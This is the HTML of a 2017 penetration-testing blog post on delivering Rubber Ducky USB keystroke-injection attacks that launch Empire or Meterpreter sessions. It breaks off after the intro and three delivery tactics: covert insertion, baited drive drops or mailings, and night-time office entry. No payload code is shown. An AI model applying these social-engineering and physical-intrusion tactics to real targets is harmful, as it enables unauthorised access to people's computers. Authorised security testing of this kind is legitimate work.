@@ -1,0 +1,443 @@
+<!doctype html>
+<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" xmlns:article="http://ogp.me/ns/article" lang="en-US" itemscope itemtype="http://schema.org/Article"  class="touch-styles">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- This is Squarespace. --><!-- sc0tfree -->
+<base href="">
+<meta charset="utf-8" />
+<title>sc0tfree &#124; Real-World Rubber Ducky Attacks with Empire Stagers</title>
+<link rel="shortcut icon" type="image/x-icon" href="https://static1.squarespace.com/static/58d82adaa5790a257a96affe/t/59109ae6e58c62a5ff7a6c9c/favicon.ico"/>
+<link rel="canonical" href="https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers"/>
+<meta property="og:site_name" content="sc0tfree"/>
+<meta property="og:title" content="Real-World Rubber Ducky Attacks with Empire Stagers"/>
+<meta property="og:latitude" content="40.7207559"/>
+<meta property="og:longitude" content="-74.00076130000002"/>
+<meta property="og:url" content="https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers"/>
+<meta property="og:type" content="article"/>
+<meta property="og:description" content="Nine times out of ten, my goal when using a  Rubber Ducky &amp;nbsp;on pentests is to launch an  Empire &amp;nbsp;or  Meterpreter &amp;nbsp;session. However, for the Ducky to type out an entire stager often takes too much time to be practical for most real-world USB attacks. This article outlines th"/>
+<meta property="og:image" content="http://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png?format=1000w"/>
+<meta property="og:image:width" content="1000"/>
+<meta property="og:image:height" content="562"/>
+<meta itemprop="name" content="Real-World Rubber Ducky Attacks with Empire Stagers"/>
+<meta itemprop="url" content="https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers"/>
+<meta itemprop="description" content="Nine times out of ten, my goal when using a  Rubber Ducky &amp;nbsp;on pentests is to launch an  Empire &amp;nbsp;or  Meterpreter &amp;nbsp;session. However, for the Ducky to type out an entire stager often takes too much time to be practical for most real-world USB attacks. This article outlines th"/>
+<meta itemprop="thumbnailUrl" content="http://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png?format=1000w"/>
+<link rel="image_src" href="http://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png?format=1000w" />
+<meta itemprop="image" content="http://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png?format=1000w"/>
+<meta name="twitter:title" content="Real-World Rubber Ducky Attacks with Empire Stagers"/>
+<meta name="twitter:image" content="http://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png?format=1000w"/>
+<meta name="twitter:url" content="https://www.sc0tfree.com/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers"/>
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:description" content="Nine times out of ten, my goal when using a  Rubber Ducky &amp;nbsp;on pentests is to launch an  Empire &amp;nbsp;or  Meterpreter &amp;nbsp;session. However, for the Ducky to type out an entire stager often takes too much time to be practical for most real-world USB attacks. This article outlines th"/>
+<meta name="description" content="Nine times out of ten, my goal when using a Rubber Ducky on pentests is to 
+launch an Empire or Meterpreter session. However, for the Ducky to type out 
+an entire stager often takes too much time to be practical for most 
+real-world USB attacks. This article outlines three techniques to optimize 
+the speed and minimize user detection of the Rubber Ducky." />
+<script type="text/javascript" src="//use.typekit.net/ik/vixqmC-wfYaXHFRny_06LU_-ByYyiZM4sP_Q69r0lMvfe73ffFHN4UJLFRbh52jhWD9tZ26kjAsyjQ9a5QgywR9ajQqhjAZcZsTtHKoDjDgXZ148ZPoDSWmyScmDSeBRZPoRdhXCdeNRjAUGdaFXOYFRwYscScm8OcFzdPUDjDgXZ148ZPoDSWmyScmDSeBRZPoRdhXCiaiaO1FRwYscScm8OcFzdPUaiaS0Shw3ieZkZA90SaBujW48Sagyjh90jhNlJ6U3ScNt-AuyOAozicIKIcBqdh48OAiyScBldhoqOWgkdkG4f5J7IMMjMkMfH6qJn3IbMg6IJMJ7f6K3UMIbMg6BJMJ7fbKlMsMMeMj6MKG4fJCgIMMjgkMfH6qJCMIbMg65JMJ7fbKwMsMMegI6MKG4fVwXIMIjgfMfH6qJN2bbMs6eJMHbMin_KwCB.js"></script>
+<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
+<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Inconsolata:700,400|Ubuntu:400"/>
+<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
+<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//static.squarespace.com/universal/scripts-compressed/common-a3bb7a3e975891038bf8-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
+<script crossorigin="anonymous" src="//static.squarespace.com/universal/scripts-compressed/common-a3bb7a3e975891038bf8-min.en-US.js" ></script><script crossorigin="anonymous" src="//static.squarespace.com/universal/scripts-compressed/performance-7cc35bf36b9ac9927346-min.en-US.js" defer ></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"facebookAppId":"314192535267336","rollups":{"squarespace-announcement-bar":{"css":"//static.squarespace.com/universal/styles-compressed/announcement-bar-d41d8cd98f00b204e9800998ecf8427e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/announcement-bar-6eba90c53c60f0b0198d-min.en-US.js"},"squarespace-audio-player":{"css":"//static.squarespace.com/universal/styles-compressed/audio-player-6c42d60d26f4e09ab1ac335b4bc55b7e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/audio-player-f72f6a14863e0aa5a553-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//static.squarespace.com/universal/styles-compressed/blog-collection-list-d41d8cd98f00b204e9800998ecf8427e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/blog-collection-list-f7ab44d4a39f2c6618a8-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//static.squarespace.com/universal/styles-compressed/calendar-block-renderer-56713b1663346e1fe5b31a3adb8f31fc-min.css","js":"//static.squarespace.com/universal/scripts-compressed/calendar-block-renderer-06a33e329ee94f6a7b0a-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//static.squarespace.com/universal/styles-compressed/chartjs-helpers-9935a41d63cf08ca108505d288c1712e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/chartjs-helpers-35b77d9468f184371518-min.en-US.js"},"squarespace-comments":{"css":"//static.squarespace.com/universal/styles-compressed/comments-c32adaffffa61675d5f238e2ea399b2b-min.css","js":"//static.squarespace.com/universal/scripts-compressed/comments-9cf82041844f63d5e099-min.en-US.js"},"squarespace-commerce-cart":{"js":"//static.squarespace.com/universal/scripts-compressed/commerce-cart-71110c54423b0295b9e8-min.en-US.js"},"squarespace-dialog":{"css":"//static.squarespace.com/universal/styles-compressed/dialog-05cf073fc485af865b2e5554077a850a-min.css","js":"//static.squarespace.com/universal/scripts-compressed/dialog-adbd5adff6190739d846-min.en-US.js"},"squarespace-events-collection":{"css":"//static.squarespace.com/universal/styles-compressed/events-collection-56713b1663346e1fe5b31a3adb8f31fc-min.css","js":"//static.squarespace.com/universal/scripts-compressed/events-collection-c723c3064f8b57fe7a3c-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//static.squarespace.com/universal/scripts-compressed/form-rendering-utils-434e4c8f95a31366915d-min.en-US.js"},"squarespace-forms":{"css":"//static.squarespace.com/universal/styles-compressed/forms-4af1b5b3c288ba939ea861fe2d37119a-min.css","js":"//static.squarespace.com/universal/scripts-compressed/forms-1259569a50569f1662d1-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//static.squarespace.com/universal/styles-compressed/gallery-collection-list-d41d8cd98f00b204e9800998ecf8427e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/gallery-collection-list-5223924a0c98e1d9d5b1-min.en-US.js"},"squarespace-image-zoom":{"css":"//static.squarespace.com/universal/styles-compressed/image-zoom-ae974921915aeccaff8ad60c60e19c31-min.css","js":"//static.squarespace.com/universal/scripts-compressed/image-zoom-3a8a313b3a131503a9d5-min.en-US.js"},"squarespace-pinterest":{"css":"//static.squarespace.com/universal/styles-compressed/pinterest-d41d8cd98f00b204e9800998ecf8427e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/pinterest-a73b3f6a40c3ebde3971-min.en-US.js"},"squarespace-popup-overlay":{"css":"//static.squarespace.com/universal/styles-compressed/popup-overlay-6b891e5f689f032ce65af5855c067b4f-min.css","js":"//static.squarespace.com/universal/scripts-compressed/popup-overlay-1d9f3bcda1f66593bc3f-min.en-US.js"},"squarespace-product-quick-view":{"css":"//static.squarespace.com/universal/styles-compressed/product-quick-view-9abaaa4dfff182aa8d4ccf3b6ffdbe8d-min.css","js":"//static.squarespace.com/universal/scripts-compressed/product-quick-view-4223734d4e2ce5a74aa7-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//static.squarespace.com/universal/styles-compressed/products-collection-item-v2-ae974921915aeccaff8ad60c60e19c31-min.css","js":"//static.squarespace.com/universal/scripts-compressed/products-collection-item-v2-4f64a7c3b9c65394b20a-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//static.squarespace.com/universal/styles-compressed/products-collection-list-v2-ae974921915aeccaff8ad60c60e19c31-min.css","js":"//static.squarespace.com/universal/scripts-compressed/products-collection-list-v2-0f39c6b6838478fb64bc-min.en-US.js"},"squarespace-search-page":{"css":"//static.squarespace.com/universal/styles-compressed/search-page-9c747eeaabe96dacfea4932a63336f54-min.css","js":"//static.squarespace.com/universal/scripts-compressed/search-page-955c7c2556a559dc748c-min.en-US.js"},"squarespace-search-preview":{"js":"//static.squarespace.com/universal/scripts-compressed/search-preview-b681413c0d200fe3fe15-min.en-US.js"},"squarespace-share-buttons":{"js":"//static.squarespace.com/universal/scripts-compressed/share-buttons-12d1eb52a91b10cbde93-min.en-US.js"},"squarespace-simple-liking":{"css":"//static.squarespace.com/universal/styles-compressed/simple-liking-09fa291ec2800c97714f0d157fd0a6ca-min.css","js":"//static.squarespace.com/universal/scripts-compressed/simple-liking-f9fa6ae7fdf6b9faab4f-min.en-US.js"},"squarespace-social-buttons":{"css":"//static.squarespace.com/universal/styles-compressed/social-buttons-7a696232d1cd101fd62b5f174f9ae6ff-min.css","js":"//static.squarespace.com/universal/scripts-compressed/social-buttons-c4bac307e198f6e666df-min.en-US.js"},"squarespace-tourdates":{"css":"//static.squarespace.com/universal/styles-compressed/tourdates-d41d8cd98f00b204e9800998ecf8427e-min.css","js":"//static.squarespace.com/universal/scripts-compressed/tourdates-ef43d3b854802a2e838f-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//static.squarespace.com/universal/styles-compressed/website-overlays-manager-923311a5ffb05ecb734ddfc7d9be08bc-min.css","js":"//static.squarespace.com/universal/scripts-compressed/website-overlays-manager-0f4a7c6bcf7f15808e5f-min.en-US.js"}},"pageType":50,"website":{"id":"58d82adaa5790a257a96affe","identifier":"sc0tfree","websiteType":1,"contentModifiedOn":1509925187062,"cloneable":false,"siteStatus":{},"language":"en-US","timeZone":"America/New_York","machineTimeZoneOffset":-14400000,"timeZoneOffset":-14400000,"timeZoneAbbr":"EDT","siteTitle":"sc0tfree","siteTagLine":"Security with impunity","siteDescription":"<p>Security with Impunity</p>","socialLogoImageId":"596d836cc534a53e65e5bcac","shareButtonOptions":{"1":true,"3":true,"4":true,"5":true,"8":true,"6":true,"2":true},"socialLogoImageUrl":"//static1.squarespace.com/static/58d82adaa5790a257a96affe/t/596d836cc534a53e65e5bcac/1509925187062/","authenticUrl":"https://www.sc0tfree.com","internalUrl":"https://sc0tfree.squarespace.com","baseUrl":"https://www.sc0tfree.com","primaryDomain":"www.sc0tfree.com","sslSetting":3,"isHstsEnabled":false,"socialAccounts":[{"serviceId":20,"userId":"henry@sc0tfree.com","screenname":"henry@sc0tfree.com","addedOn":1494263556086,"profileUrl":"mailto:henry@sc0tfree.com","iconEnabled":true,"serviceName":"email"},{"serviceId":4,"userId":"845306459281870848","userName":"sc0tfree","screenname":"Henry Prince","addedOn":1491245118024,"profileUrl":"https://twitter.com/sc0tfree","iconUrl":"http://abs.twimg.com/sticky/default_profile_images/default_profile_normal.png","collectionId":"58e2983e893fc0a495c8b5d6","iconEnabled":true,"serviceName":"twitter"},{"serviceId":23,"userId":"25855134","userName":"sc0tfree","screenname":"Henry Prince","addedOn":1491245166128,"profileUrl":"https://github.com/sc0tfree","iconUrl":"https://avatars3.githubusercontent.com/u/25855134?v=3","iconEnabled":true,"serviceName":"github"},{"serviceId":43,"screenname":"Reddit","addedOn":1491245380704,"profileUrl":"https://www.reddit.com/user/sc0tfree/","iconEnabled":true,"serviceName":"reddit"},{"serviceId":14,"userId":"u9wXZEASM4","userName":"sc0tfree","screenname":"Henry Prince, OSCP","addedOn":1501601203702,"profileUrl":"https://www.linkedin.com/in/sc0tfree","iconUrl":"https://media.licdn.com/mpr/mprx/0_V5_s-Lj-mPjfnO5ysLCL-be02na394qyN3BL-QR71vVAdyipn_Pny67TGOmOv0zKRQTkj3dWUqcx","iconEnabled":true,"serviceName":"linkedin"}],"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"screenshotId":"79cb51b5"},"websiteSettings":{"id":"58d82adaa5790a257a96b000","websiteId":"58d82adaa5790a257a96affe","type":"Personal","subjects":[],"country":"US","state":"NY","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"announcementBarSettings":{"style":1,"text":""},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"contactPhoneNumber":"","storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"paymentSettings":{},"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"multipleQuantityAllowedForServices":true,"currenciesSupported":["CHF","HKD","MXN","EUR","DKK","USD","CAD","MYR","NOK","THB","AUD","SGD","ILS","PLN","GBP","CZK","SEK","NZD","PHP","RUB"],"defaultCurrency":"USD","selectedCurrency":"USD","measurementStandard":1,"showCustomCheckoutForm":false,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"isLive":false},"useEscapeKeyToLogin":true,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"ampEnabled":false},"cookieSettings":{"isRestrictiveCookiePolicyEnabled":false,"isRestrictiveCookiePolicyAbsolute":false},"websiteCloneable":false,"collection":{"title":"sc0tfree-blog","id":"58d84de51b10e366b42d3b4a","fullUrl":"/sc0tfree-blog/","type":1},"item":{"title":"Real-World Rubber Ducky Attacks with Empire Stagers","id":"596107b472af6554d01728a6","fullUrl":"/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers","publicCommentCount":0,"commentState":2,"recordType":1},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"aspect-ratio":"Auto","banner-slideshow-controls":"Arrows","gallery-arrow-style":"No Background","gallery-aspect-ratio":"3:2 Standard","gallery-auto-crop":"true","gallery-autoplay":"false","gallery-design":"Grid","gallery-info-overlay":"Show on Hover","gallery-loop":"false","gallery-navigation":"Bullets","gallery-show-arrows":"true","gallery-transitions":"Fade","galleryArrowBackground":"rgba(34,34,34,1)","galleryArrowColor":"rgba(255,255,255,1)","galleryAutoplaySpeed":"3","galleryCircleColor":"rgba(255,255,255,1)","galleryInfoBackground":"rgba(0, 0, 0, .7)","galleryThumbnailSize":"100px","gridSize":"280px","gridSpacing":"10px","logoContainerWidth":"140px","product-gallery-auto-crop":"false","product-image-auto-crop":"true","siteTitleContainerWidth":"220px"},"templateId":"52a74dafe4b073a80cd253c5","pageFeatures":[1,2,4],"impersonatedSession":false,"demoCollections":[{"collectionId":"52b1eff5e4b0871946c207e4","deleted":true},{"collectionId":"52a76dc2e4b0dfaa507e7b32","deleted":true},{"collectionId":"52c71337e4b07aa29e46fa44","deleted":true},{"collectionId":"52d8053ce4b0e26973428261","deleted":true},{"collectionId":"52cad0a1e4b06ad2e57287af","deleted":true},{"collectionId":"52d067ace4b0bd5a03cf573b","deleted":true},{"collectionId":"52e18d59e4b08face9704bad","deleted":true},{"collectionId":"52d80724e4b0c692d7428ff2","deleted":true},{"collectionId":"52a76db3e4b0dfaa507e7b18","deleted":true},{"collectionId":"52e175e7e4b03c845ac17314","deleted":true}],"isFacebookTab":false,"tzData":{"zones":[[-300,"US","E%sT",null]],"rules":{"US":[[1967,2006,null,"Oct","lastSun","2:00","0","S"],[1987,2006,null,"Apr","Sun>=1","2:00","1:00","D"],[2007,"max",null,"Mar","Sun>=8","2:00","1:00","D"],[2007,"max",null,"Nov","Sun>=1","2:00","0","S"]]}},"useNewImageLoader":true};</script><script type="text/javascript"> SquarespaceFonts.loadViaContext(); Squarespace.load(window);</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.sc0tfree.com/sc0tfree-blog?format=RSS" />
+<script type="application/ld+json">{"url":"https://www.sc0tfree.com","name":"sc0tfree","description":"<p>Security with Impunity</p>","@context":"http://schema.org","@type":"WebSite"}</script><!--[if gte IE 9]> <link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&part=1"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&part=2"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&part=3"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&part=4"/><![endif]-->
+<!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&noMedia=true&part=1"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&noMedia=true&part=2"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&noMedia=true&part=3"/><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false&noMedia=true&part=4"/><![endif]-->
+<!--[if !IE]> --><link rel="stylesheet" type="text/css" href="//static1.squarespace.com/static/sitecss/58d82adaa5790a257a96affe/56/52a74dafe4b073a80cd253c5/58d8361e1b631bd2a70e32e2/1009-05142015/1506122370908/site.css?&filterFeatures=false"/><!-- <![endif]-->
+<!-- End of Squarespace Headers -->
+    <script>/* Must be below squarespace-headers */(function(){var e='ontouchstart'in window||navigator.msMaxTouchPoints;var t=document.documentElement;if(!e&&t){t.className=t.className.replace(/touch-styles/,'')}})()
+    </script>
+  </head>
+
+  <body id="item-596107b472af6554d01728a6" class="nav-button-style-outline nav-button-corner-style-pill banner-button-style-solid banner-button-corner-style-pill banner-slideshow-controls-arrows meta-priority-date  hide-entry-author hide-list-entry-footer    hide-blog-sidebar center-navigation--info    event-show-past-events event-thumbnails event-thumbnail-size-32-standard event-date-label  event-list-show-cats event-list-date event-list-time event-list-address   event-icalgcal-links  event-excerpts      gallery-design-grid aspect-ratio-auto lightbox-style-light gallery-navigation-bullets gallery-info-overlay-show-on-hover gallery-aspect-ratio-32-standard gallery-arrow-style-no-background gallery-transitions-fade gallery-show-arrows gallery-auto-crop   product-list-titles-under product-list-alignment-center product-item-size-11-square product-image-auto-crop product-gallery-size-11-square  show-product-price show-product-item-nav product-social-sharing newsletter-style-dark hide-opentable-icons opentable-style-dark small-button-style-solid small-button-shape-square medium-button-style-solid medium-button-shape-square large-button-style-solid large-button-shape-square image-block-poster-text-alignment-center image-block-card-dynamic-font-sizing image-block-card-content-position-center image-block-card-text-alignment-left image-block-overlap-dynamic-font-sizing image-block-overlap-content-position-center image-block-overlap-text-alignment-left image-block-collage-dynamic-font-sizing image-block-collage-content-position-top image-block-collage-text-alignment-left image-block-stack-dynamic-font-sizing image-block-stack-text-alignment-left button-style-solid button-corner-style-square tweak-product-quick-view-button-style-floating tweak-product-quick-view-button-position-bottom tweak-product-quick-view-lightbox-excerpt-display-truncate tweak-product-quick-view-lightbox-show-arrows tweak-product-quick-view-lightbox-show-close-button tweak-product-quick-view-lightbox-controls-weight-light native-currency-code-usd view-item collection-58d84de51b10e366b42d3b4a collection-type-blog collection-layout-default mobile-style-available has-banner-image item-main-image">
+    <a href="#" class="body-overlay"></a>
+    <div class="sqs-announcement-bar-dropzone"></div>
+    <div id="sidecarNav">
+      
+
+  <div id="mobileNavWrapper" class="nav-wrapper" data-content-field="navigation-mobileNav">
+    <nav id="mobileNavigation">
+      
+
+      
+        
+          
+
+          
+
+            
+            <div class="collection homepage">
+              <a href="/">
+                Home
+              </a>
+            </div>
+            
+
+          
+        
+        
+
+      
+        
+          
+
+          
+
+            
+            <div class="collection">
+              <a href="/blog/">
+                Blog
+              </a>
+            </div>
+            
+
+          
+        
+        
+
+      
+        
+          
+          <div class="external">
+            <a href="https://github.com/sc0tfree" target="_blank">
+              GitHub
+            </a>
+          </div>
+          
+
+        
+
+      
+        
+          
+          <div class="external">
+            <a href="https://keybase.io/sc0tfree" target="_blank">
+              Keybase
+            </a>
+          </div>
+          
+
+        
+
+      
+    </nav>
+  </div>
+
+
+
+    </div>
+    <div id="siteWrapper" class="clearfix">
+
+      <div class="sqs-cart-dropzone"></div>
+
+      <header id="header" class="show-on-scroll" data-offset-el=".index-section" data-offset-behavior="bottom" role="banner">
+        <div class="header-inner">
+          <div id="siteTitleWrapper" class="wrapper" data-content-field="site-title">
+            
+              <h1 id="siteTitle" class="site-title"><a href="/">sc0tfree</a></h1>
+            
+          </div><!--
+          --><div class="mobile-nav-toggle"><div class="top-bar"></div><div class="middle-bar"></div><div class="bottom-bar"></div></div><div class="mobile-nav-toggle fixed-nav-toggle"><div class="top-bar"></div><div class="middle-bar"></div><div class="bottom-bar"></div></div><!--
+          --><div id="headerNav">
+
+  <div id="mainNavWrapper" class="nav-wrapper" data-content-field="navigation-mainNav">
+    <nav id="mainNavigation" data-content-field="navigation-mainNav">
+      
+
+      
+        
+          
+
+          
+
+            
+            <div class="collection homepage">
+              <a href="/">
+                Home
+              </a>
+            </div>
+            
+
+          
+        
+        
+
+      
+        
+          
+
+          
+
+            
+            <div class="collection">
+              <a href="/blog/">
+                Blog
+              </a>
+            </div>
+            
+
+          
+        
+        
+
+      
+        
+          
+          <div class="external">
+            <a href="https://github.com/sc0tfree" target="_blank">
+              GitHub
+            </a>
+          </div>
+          
+
+        
+
+      
+        
+          
+          <div class="external">
+            <a href="https://keybase.io/sc0tfree" target="_blank">
+              Keybase
+            </a>
+          </div>
+          
+
+        
+
+      
+    </nav>
+  </div>
+  <!-- style below blocks out the mobile nav toggle only when nav is loaded -->
+  <style>.mobile-nav-toggle-label { display: inline-block !important; }</style>
+
+
+</div>
+        </div>
+      </header>
+
+      
+        
+          
+            
+              
+                <div class="banner-thumbnail-wrapper" data-content-field="main-image">
+                  <div class="color-overlay"></div>
+                  <figure id="thumbnail" class="loading content-fill"><img data-src="https://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png" data-image="https://static1.squarespace.com/static/58d82adaa5790a257a96affe/58d84de51b10e366b42d3b4a/596107b472af6554d01728a6/1500382618121/Ducky+Pic+MASTER+v2.png" data-image-dimensions="2000x1125" data-image-focal-point="0.5,0.5" alt="Real-World Rubber Ducky Attacks with Empire Stagers"  /></figure>
+                  <div class="blog-item-wrapper">
+                    <div class="title-desc-wrapper">
+                      <time class="dt-published published post-date" datetime="2017-07-18" pubdate>July 18, 2017</time>
+                      <div class="post-category"></div>
+                      <div class="post-author"><a href="/sc0tfree-blog/?author=58d82ad9a5790a257a96affc">Henry Prince</a></div>
+                      <div class="post-title">Real-World Rubber Ducky Attacks with Empire Stagers</div>
+                    </div>
+                  </div>
+                </div>
+              
+            
+          
+        
+      
+
+
+      
+      
+      
+
+      <main id="page" role="main">
+        
+        <!--
+        --><!--
+        --><div id="content" class="main-content" data-content-field="main-content" data-collection-id="58d84de51b10e366b42d3b4a" data-edit-main-image="Banner">
+         <div class="blog-item">
+
+  
+  <article class="entry h-entry hentry tag-rubber-ducky tag-powershell tag-empire tag-usb author-henry-prince post-type-text has-main-image clear" id="article-596107b472af6554d01728a6" data-item-id="596107b472af6554d01728a6">
+
+    <header class="entry-header">
+      <div class="meta-above-title">
+        
+        <div class="entry-byline">
+          <span class="entry-author"><a href="/sc0tfree-blog/?author=58d82ad9a5790a257a96affc" class="p-author author entry-byline-link" rel="author">Henry Prince</a></span>
+        </div>
+        
+        <div class="entry-dateline">
+          <time class="dt-published published entry-date" datetime="2017-07-18" pubdate><a href="/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers" class="entry-dateline-link">July 18, 2017</a></time>
+          <time class="dt-updated updated" datetime="2017-07-18"></time>
+        </div>
+        
+      </div>
+      <h1 data-content-field="title" class="entry-title p-name">
+      
+        <a href="/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers" class="u-url" rel="bookmark">Real-World Rubber Ducky Attacks with Empire Stagers</a>
+      
+      </h1>
+      <div class="meta-below-title no-categories">
+        
+        <div class="entry-byline">
+          <span class="entry-author"><a href="/sc0tfree-blog/?author=58d82ad9a5790a257a96affc" class="p-author author entry-byline-link" rel="author">Henry Prince</a></span>
+        </div>
+        
+        <div class="entry-dateline">
+          <time class="dt-published published entry-date" datetime="2017-07-18" pubdate><a href="/sc0tfree-blog/optimizing-rubber-ducky-attacks-with-empire-stagers" class="entry-dateline-link">July 18, 2017</a></time>
+          <time class="dt-updated updated" datetime="2017-07-18"></time>
+        </div>
+        
+      </div>
+    </header>
+
+    <div class="entry-content e-content">
+      
+        <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" data-updated-on="1499531242702" id="item-596107b472af6554d01728a6"><div class="row sqs-row"><div class="col sqs-col-12 span-12"><div class="sqs-block html-block sqs-block-html" data-block-type="2" id="block-yui_3_17_2_1_1499531171149_29737"><div class="sqs-block-content"><p>Nine times out of ten, my goal when using a <a target="_blank" href="https://hakshop.com/products/usb-rubber-ducky-deluxe">Rubber Ducky</a>&nbsp;on pentests is to launch an <a target="_blank" href="https://www.powershellempire.com/">Empire</a> or <a target="_blank" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/">Meterpreter</a> session. However, for the Ducky to type out an entire stager often takes too much time to be practical for most real-world USB attacks. This article outlines three techniques to optimize the speed and minimize user detection of the Rubber Ducky.</p><h1>Rubber Ducky Attack Vectors</h1><h3>The Sneak</h3><p style="margin-left:40px">Find a solid distraction for the user and, when they're not looking, insert the Ducky into an accessible USB port.</p><p style="margin-left:40px"><strong>Pros:</strong>&nbsp;Payload delivery is guaranteed; The user never examines the Ducky.</p><p style="margin-left:40px"><strong>Cons:</strong> It sucks getting caught;&nbsp;You usually have <strong>very little time</strong>, depending on the misdirection and ease of access to USB ports.</p><h3>The Drop</h3><p style="margin-left:40px">Leave a Ducky around the office:&nbsp;reception, parking lots and bathrooms are usually easy to access and quite successful. Going the extra step to physically label the drive something juicy is well worth it. The Drop also includes sending the Ducky via Priority FedEx, which is a wildly effective vector with the right pretext.</p><p style="margin-left:40px"><strong>Pros:</strong> You don't get caught; People tend to quickly become voyeurs when they see a USB key marked "2016 Vacation Photos".</p><p style="margin-left:40px"><strong>Cons:</strong> Users are staring at their screens during injection and are much more likely to notice unusual behavior.&nbsp;</p><h3>The Watergate</h3><p style="margin-left:40px">Slip into an unattended office, usually at night, bypassing physical security controls. 